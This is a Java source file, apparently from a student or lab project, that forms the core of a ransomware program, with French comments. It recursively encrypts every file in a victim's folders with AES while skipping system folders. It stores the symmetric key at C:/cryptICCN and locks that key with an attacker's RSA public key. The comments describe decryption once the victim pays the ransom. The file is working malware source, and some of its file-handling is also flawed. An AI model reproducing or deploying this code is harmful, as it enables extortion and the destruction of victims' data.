package ma.inpt.iccn.crypto;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;
import java.util.ArrayList;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;

public class Cryptage {
	private static List<String> dossiersSysteme=new ArrayList<String>(){{
		add("Windows");add("Programmes");add("Program Files (x86)");add("cryptICCN");add("cles");
	}};
	/****************************************************************************
	 * Fonction de cryptage et décryptage de fichier
	 * **************************************************************************/
	public static void encrypterDecrypterFichier(int mode, SecretKey cle,String source, String cible) throws NoSuchAlgorithmException,NoSuchPaddingException, InvalidKeyException {
		Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
		cipher.init(mode, cle);

		FileInputStream fis = null;
		FileOutputStream fos = null;
		CipherInputStream cis = null;

		try {
			fis = new FileInputStream(source);
		    cis = new CipherInputStream(fis, cipher);
		    fos = new FileOutputStream(cible);
		    byte[] b = new byte[8];
		    int i = cis.read(b);
		    while (i != -1){
		        fos.write(b, 0, i);
		        i = cis.read(b);
		      }
		    } catch (IOException ioe) {
		      if (fis != null) {
		        try {
		          fis.close();
		        } catch (IOException e) {
		          e.printStackTrace();
		        }
		      }
		      if (fos != null) {
		        try {
		          fos.close();
		        } catch (IOException e) {
		          e.printStackTrace();
		        }
		      }
		    }
	}
	/****************************************************************************************************/
	
	
	/************************************************************************************
	 * Fonction permettant de crypter un fichier(elle fait appel à la fonction précédente)
	 * **********************************************************************************/
	public static void crypterFichier(SecretKey cle, String source, String cible)throws NoSuchAlgorithmException, NoSuchPaddingException,InvalidKeyException {
		encrypterDecrypterFichier(Cipher.ENCRYPT_MODE, cle, source, cible);
	}
	/************************************************************************************/

	
	/**********************************************************************************************
	 * Fonction permettant de decrypter un fichier(elle fait appel à la fonction encrypterDecrypter)
	 * ********************************************************************************************/
	public static void decrypterFichier(SecretKey cle, String source, String cible)throws NoSuchAlgorithmException, NoSuchPaddingException,InvalidKeyException {
		encrypterDecrypterFichier(Cipher.DECRYPT_MODE, cle, source, cible);
	}
	/************************************************************************************/
	
	
	/************************************************************************************
	 * Fonction recursive permettant de crypter tous les fichiers d'un dossier
	 * **********************************************************************************/
	public static void crypterDossier(String racine, SecretKey cle) throws InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException {
		File f=new File(racine);
		if(f.exists()) {
			String[] contenu=f.list();
			for(int i=0;i<contenu.length;i++) {
				String chemin=racine+contenu[i]+"/";
				File f2=new File(chemin);
				if(f2.isFile()) crypterFichier(cle, f2.getAbsolutePath(), f2.getAbsolutePath());
				else {
					int index=dossiersSysteme.indexOf(contenu[i]);
					if(index==-1) crypterDossier(f2.getAbsolutePath()+"/", cle);
				}
			}
		}
	}
	/***************************************************************************************/
	
	
	/*******************************************************************************************
	 * Fonction recursive permettant de decrypter tous les fichiers d'un dossier
	 * elle sera appelée lorsque la victime aura "payer" la rançon et décrypté la clé symétrique
	 * *****************************************************************************************/
	public static void decrypterDossier(String racine, SecretKey cle) throws InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException {
		File f=new File(racine);
		if(f.exists()) {
			String[] contenu=f.list();
			for(int i=0;i<contenu.length;i++) {
				String chemin=racine+contenu[i]+"/";
				File f2=new File(chemin);
				if(f2.isFile()) decrypterFichier(cle, f2.getAbsolutePath(), f2.getAbsolutePath());
				else {
					int index=dossiersSysteme.indexOf(contenu[i]);
					if(index==-1) decrypterDossier(f2.getAbsolutePath()+"/", cle);
				} 
			}
		}
	}
	/***************************************************************************************/
	
	
	/******************************************************************
	 * Fonction permettant de récupérer la clé public RSA
	 * ****************************************************************/
	public static PublicKey getClePublic(String cle) throws Exception {
		byte[] bytes = Files.readAllBytes(Paths.get(cle));
	    X509EncodedKeySpec ks = new X509EncodedKeySpec(bytes);
	    KeyFactory kf = KeyFactory.getInstance("RSA");
	    PublicKey key = kf.generatePublic(ks);
	    return key;
	}
	
	/******************************************************************
	 * Fonction permettant de lire la clé privée RSA
	 * ****************************************************************/
	public static PrivateKey getClePrivee(String cle) throws Exception {
		byte[] bytes = Files.readAllBytes(Paths.get(cle));
		PKCS8EncodedKeySpec ks = new PKCS8EncodedKeySpec(bytes);
		KeyFactory kf = KeyFactory.getInstance("RSA");
		PrivateKey pvt = kf.generatePrivate(ks);
	    return pvt;
	}
	
	/********************************************************************************
	 * Fonction permettant de stocker la clé symétrique dans le disque de la victime
	 * Dans son disque local C, on crée un dossier "cryptICCN" pour le stocker
	 * ******************************************************************************/
	public static void stockageCleDecryptage(SecretKey cle) throws Exception {
		 File f= new File("C:/cryptICCN");
	      if(!f.exists()) f.mkdir();
	      FileOutputStream out=new FileOutputStream("C:/cryptICCN/decrypt.key");
	      out.write(cle.getEncoded());
	      out.close();
	}
	/*********************************************************************************/
	
	
	/*******************************************************************************************
	 * Fonction permettant de crypter la clé symétrique stocker chez la victime en utilisant
	 * la clé public RSA
	 * ****************************************************************************************/
	public static void crypterCle(PublicKey key, String source, String cible) throws Exception, Exception {
		Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
		cipher.init(Cipher.ENCRYPT_MODE, key);
		FileInputStream in = new FileInputStream(source);
		FileOutputStream out = new FileOutputStream(cible);
		byte[] ibuf = new byte[2048];
	    int len;
	    while ((len = in.read(ibuf)) != -1) {
	        byte[] obuf = cipher.update(ibuf, 0, len);
	        if ( obuf != null ) out.write(obuf);
	    }
	    byte[] obuf = cipher.doFinal();
	    if ( obuf != null ) out.write(obuf);
	    in.close();out.close();
	}
	/******************************************************************************************/
	
	
	/*******************************************************************************************
	 * Fonction permettant de decrypter la clé symétrique stocker chez la victime en utilisant
	 * la clé privé RSA qui sera transmit par l'attaquant
	 * ****************************************************************************************/
	public static void decrypterCle(PrivateKey key, String source, String cible) throws Exception, Exception {
		Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
		cipher.init(Cipher.DECRYPT_MODE, key);
		FileInputStream in = new FileInputStream(source);
		FileOutputStream out = new FileOutputStream(cible);
		byte[] ibuf = new byte[2048];
	    int len;
	    while ((len = in.read(ibuf)) != -1) {
	        byte[] obuf = cipher.update(ibuf, 0, len);
	        if ( obuf != null ) out.write(obuf);
	    }
	    byte[] obuf = cipher.doFinal();
	    if ( obuf != null ) out.write(obuf);
	    in.close();out.close();
	}
	/******************************************************************************************/
}
